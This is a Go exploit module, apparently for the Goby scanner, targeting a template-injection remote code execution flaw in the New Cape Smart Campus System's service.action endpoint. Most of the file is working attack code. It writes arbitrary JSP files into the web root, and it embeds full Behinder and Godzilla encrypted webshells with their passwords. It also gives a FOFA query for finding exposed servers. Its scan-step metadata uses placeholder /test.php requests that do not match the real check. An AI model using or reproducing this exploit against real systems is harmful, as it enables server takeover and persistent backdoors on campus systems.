package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "New Cape Smart Campus System service.action Remote Code Execution Vulnerability",
    "Description": "<p>New Cape Smart Campus System is a campus management platform.</p><p>There is a code execution vulnerability in the New Cape Smart Campus system. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "newcapec-smartcampussystem",
    "Homepage": "http://www.newcapec.com.cn/",
    "DisclosureDate": "2023-08-13",
    "PostTime": "2023-08-14",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "body=\"掌上校园服务管理平台\"",
    "GobyQuery": "body=\"掌上校园服务管理平台\"",
    "Level": "3",
    "Impact": "<p>There is a code execution vulnerability in the New Cape Smart Campus system. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The solution has been provided, please pay attention to the update of the manufacturer's homepage: <a href=\"http://www.newcapec.com.cn/\">http://www.newcapec.com.cn/</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [
        "http://www.newcapec.com.cn/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "File Upload"
    ],
    "VulType": [
        "Code Execution",
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "新开普智慧校园系统 service.action 远程代码执行漏洞",
            "Product": "新开普-智慧校园系统",
            "Description": "<p>新开普智慧校园系统是一个校园管理平台。<br></p><p>新开普智慧校园系统存在代码执行漏洞，攻击者可通过该漏洞在服务器端执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>目前已提供解决方案，请关注厂商主页更新：<a href=\"http://www.newcapec.com.cn/\" target=\"_blank\">http://www.newcapec.com.cn/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "代码执行",
                "文件上传"
            ],
            "Tags": [
                "代码执行",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "New Cape Smart Campus System service.action Remote Code Execution Vulnerability",
            "Product": "newcapec-smartcampussystem",
            "Description": "<p>New Cape Smart Campus System is a campus management platform.</p><p>There is a code execution vulnerability in the New Cape Smart Campus system. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The solution has been provided, please pay attention to the update of the manufacturer's homepage: <a href=\"http://www.newcapec.com.cn/\" target=\"_blank\">http://www.newcapec.com.cn/</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is a code execution vulnerability in the New Cape Smart Campus system. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution",
                "File Upload"
            ],
            "Tags": [
                "Code Execution",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10824"
}`

	sendPayload202df567 := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/service_transport/service.action")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		payload := `${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter",` + strconv.Quote(`./webapps/ROOT/`+filename) + `).append(` + strconv.Quote(content) + `).close()}`
		payload = strconv.Quote(payload)
		cfg.Data = `{"command": "GetFZinfo", "UnitCode": ` + payload + `}`
		_, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}

		cfgCheck := httpclient.NewGetRequestConfig("/" + filename)
		cfgCheck.VerifyTls = false
		cfgCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgCheck)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(16) + ".jsp"
			rsp, err := sendPayload202df567(u, filename, "<% out.println(\""+checkStr+"\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>")
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "out.println")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "cmd" {

			}
			if attackType == "webshell" {
				filename = goutils.RandomHexString(16) + ".jsp"
				if webshell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %><%! class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64 = Class.forName("java.util.Base64"); Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e) {try { base64 = Class.forName("sun.misc.BASE64Decoder");  Object decoder = base64.newInstance();  value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) {}}return value;}%><% if(request.getMethod().equals("POST")){String k = "e45e329feb5d925b";session.putValue("u", k);Cipher c = Cipher.getInstance("AES");c.init(2, new SecretKeySpec(k.getBytes(), "AES"));StringBuilder sb = new StringBuilder();InputStream inputStream = request.getInputStream();BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));String line;while ((line = reader.readLine()) != null) {sb.append(line);}String data = sb.toString();byte[] bytes = c.doFinal(base64Decode(data));new U(this.getClass().getClassLoader()).g(bytes).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
				}
			}
			rsp, err := sendPayload202df567(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			} else {
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
			}
			expResult.Output += "Webshell type: jsp"
			return expResult
		},
	))
}
